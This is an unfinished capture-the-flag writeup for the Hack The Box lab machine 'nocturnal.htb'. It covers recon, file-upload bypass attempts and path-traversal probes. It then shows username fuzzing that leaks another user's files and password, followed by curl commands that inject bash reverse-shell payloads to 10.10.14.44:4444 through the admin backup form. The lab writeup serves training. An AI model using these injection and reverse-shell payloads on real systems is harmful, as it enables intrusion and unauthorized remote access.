# 🔍 Hack The Box - `nocturnal.htb` Writeup  
**Difficulty**: Medium  
**IP Address**: `10.129.232.23`  
**Hostname**: `nocturnal.htb`  
**Author**: Your relentless enumeration 😤💪  

---

## 🌐 Initial Recon - Nmap All The Things!

```bash
nmap -sC -sV -oN nmap/initial 10.129.232.23
```

**Results:**
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu
80/tcp open  http    nginx 1.18.0 Ubuntu
```

⏩ Port 80 auto-redirects to `http://nocturnal.htb/`  
🧠 Add to `/etc/hosts`:

```bash
echo "10.129.232.23 nocturnal.htb" | sudo tee -a /etc/hosts
```

---

## 🕸️ Web Enumeration - Portal Discovery!

Browsing to `http://nocturnal.htb/` gives us a **file upload login portal**.

🪪 Login discovered via guesswork:

```text
Username: user
Password: user
```

✅ Successful login reveals an upload form.

📝 After upload, files are available at:

```
http://nocturnal.htb/view.php?username=user&file=<filename>
```

---

## 📂 File Upload Analysis - Let the Shell Games Begin!

Allowed extensions (as per error message):

```text
Invalid file type. pdf, doc, docx, xls, xlsx, odt are allowed.
```

### 🔥 Attempted Payloads

| Payload                        | Result                                              |
|-------------------------------|-----------------------------------------------------|
| `shell.php.doc`               | Upload successful, but no execution 😤              |
| `shell.php%00.doc`            | Server responds, but no null byte behavior observed |
| `?file=shell.php.doc`         | File shown as plain text – PHP not parsed           |
| `?file=shell.doc`             | Same result                                         |
| `?file=shell.php%250.doc`     | No execution, `%250` ineffective                    |

### 🔬 Theory:

- PHP is **not parsed**, likely due to Nginx config treating uploads as static files.
- `view.php` appears to **read** and **stream** files, not include/execute.
- Extension restriction bypass attempts (null byte, double extensions) all failed.

---

## 📁 Directory Enumeration - Hidden Paths Discovered!

### 🔎 Directory Brute-force with FFUF:

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u "http://nocturnal.htb/FUZZ" -r
```

🧾 Notable Results:

```
uploads     [Status: 403]
uploads2    [Status: 403]
backups     [Status: 403]
```

🔐 Forbidden — confirms those dirs **exist** but are protected by Nginx or file perms.

---

## 🌐 Subdomain Fuzzing - Expanding the Surface

```bash
wfuzz -c -w subdomains.txt -u 'http://nocturnal.htb/' -H "Host: FUZZ.nocturnal.htb" --hw 10
```

⚠️ No valid subdomains returned — all 200 responses were default page sizes.

---

## 🧩 Current Summary

### ✅ Confirmed:
- Uploads are saved to a user-specific directory
- Uploads are accessible via `view.php` but only rendered/downloaded — **not executed**
- Extensions restricted to doc-like types (`.pdf`, `.doc`, etc.)
- Directories like `/uploads`, `/uploads2`, `/backups` exist but are **403 Forbidden**
- No working RCE or LFI behavior yet
- Subdomain fuzzing yielded no results

### ❌ Tried and Failed:
- `shell.php.doc` → no execution
- Double extensions, null byte injection, `%250` tricks
- Subdomain brute-forcing
- Direct access to `/uploads` — forbidden

---

## 🧠 Hypothesis Going Forward

### Potential Exploit Vectors to Investigate:

1. **File Parsing Exploit**
   - Upload malformed `.docx`, `.pdf` etc. with embedded payloads.
   - Leverage tools like `Burp`, `Metasploit`, or `officeparser` for OLE/Docx macro injection.

2. **SSRF / LFI via `view.php`**
   - Try accessing internal resources via:
     ```http
     /view.php?username=user&file=../../../../../../etc/passwd
     /view.php?username=admin&file=secret.txt
     /view.php?username=../uploads2&file=shell.doc
     ```
   - Maybe `view.php` has weak path sanitization.

3. **File Overwrite**
   - Attempt file overwrite on backend — is `view.php` using real path with `username`/`file` directly?

4. **Upload Triggers (Cron / Parser)**
   - Maybe another process (like an AV scanner or cron job) parses uploaded documents — try:
     - **.pdf with JavaScript**
     - **.docx with macro**

5. **Monitor for Time-Based Execution**
   - Upload payloads, then monitor traffic for delayed callback (watch `tcpdump` on tun0).

---

## 🔚 Final Thoughts (for now)

You've fully mapped the front door — login, upload, directory structure. The next step is **deeper exploitation via document payloads**, LFI edge cases, or back-end parser triggers. This box is taunting you with a classic **"uploads, but no execution"** trap!

## 🕵️‍♂️ Username Discovery via FFUF - Let's Fuzz 'em Out!

We tried to find other valid `username=` values using FFUF with a large wordlist:

```bash
ffuf \
  -w username.txt \
  -u 'http://nocturnal.htb/view.php?username=FUZZ&file=bad.odt' \
  -H "Cookie: PHPSESSID=eeu8n9ediu7qa4jnveg0jcpjjd" \
  -fc 403 -t 50 -ac -c
```

🎯 **Hits Found!**

```
admin                   [Status: 200]
amanda                  [Status: 200]
tobias                  [Status: 200]
...
```

We now know these usernames have file directories and can be queried with `view.php`.

---

## 📁 Dump Amanda’s Uploads - The Juicy Bits Appear!

We attempted to fetch a non-existent file from Amanda's space to trigger a file list leak:

```bash
curl -s 'http://nocturnal.htb/view.php?username=amanda&file=nonexist.odt'
```

🎯 **Success! File listing returned.**  
We fuzzed or manually tested each discovered filename and downloaded files, eventually retrieving a document (likely `.odt`) containing Amanda's **password**.

---

## 🔐 Admin Login - The Gate Opens!

Login to the admin panel using Amanda’s credentials:

```text
Username: amanda
Password: [extracted from downloaded file]
```

🎉 Admin panel unlocked!  
Navigate to `admin.php` — it includes a form to generate backups. This form accepts a `password` field and a `backup` button.

---

## 🧨 Command Injection in Password Field!

We discovered that the `password` field is directly passed into a shell command behind the scenes. This is likely a classic command injection vulnerability.

### 🔬 Initial Test Payload:

Try a simple test to confirm code execution:

```bash
curl -X POST "http://nocturnal.htb/admin.php?view=dashboard.php" \
  -H "Cookie: PHPSESSID=pr4mhlgg8d9nk2v2cnn6kro302" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data-urlencode $'password=\nbash\t-c\t"ls"\n' \
  --data "backup="
```

✅ Command executed — response included file listing output!

---

## 🐚 Let's Try a Reverse Shell Payload!

Target IP: `10.10.14.44`  
Listener Port: `4444`

### 🔉 Set up a Netcat listener:

```bash
nc -lvnp 4444
```

### 📡 Inject Reverse Shell via URL-encoded Payload:

```bash
curl -X POST "http://nocturnal.htb/admin.php?view=dashboard.php" \
  -H "Cookie: PHPSESSID=pr4mhlgg8d9nk2v2cnn6kro302" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data-urlencode $'password=\nbash\t-i\t>&\t/dev/tcp/10.10.14.44/4444\t0>&1\n' \
  --data "backup="
```

```bash 
 curl -X POST "http://nocturnal.htb/admin.php?view=dashboard.php"   -H "Cookie: PHPSESSID=pr4mhlgg8d9nk2v2cnn6kro302"   -H "Content-Type: application/x-www-form-urlencoded"   --data-urlencode $'password=\nbash\t-c\t"ls"\n'   --data "backup="      
```


We tried multiple variations:

- `%0Abash%09-i%09%3E%26%09/dev/tcp/10.10.14.44/4444%090%3E%261`
- `%0Abash%09-i%09%3E%26%09%2Fdev%2Ftcp%2F10.10.14.44%2F4444%090%3E%261`
- `%0Abash%09-i%09>&%09/dev/tcp/10.10.14.44/4444%090>&1`
- `\nexec\tbash\t-i\t>\t/dev/tcp/10.10.14.44/4444\t0</dev/tcp/10.10.14.44/44442>/dev/null`

Each one is a variation of a **bash reverse shell** using either newline/tab characters or their URL-encoded equivalents to try to bypass any input sanitization.

---

## ⏳ Status

- ✅ Verified command injection via `password` field
- ✅ Remote shell possible — pending correct payload execution
- 🧪 Trying different shell syntax variants to bypass filters and get execution

---

## 🔭 Next Steps

- 🔁 Keep testing reverse shell syntax
- 💡 Try alternative shells (`sh`, `nc`, `python`)
- 📉 Use `tcpdump` or Wireshark to confirm connection attempts if shell doesn’t return
- 👀 Review downloaded `admin.php` (from backup) to analyze sanitization logic

Stay tuned — we're *so close* to shellfire! 🔥🐚
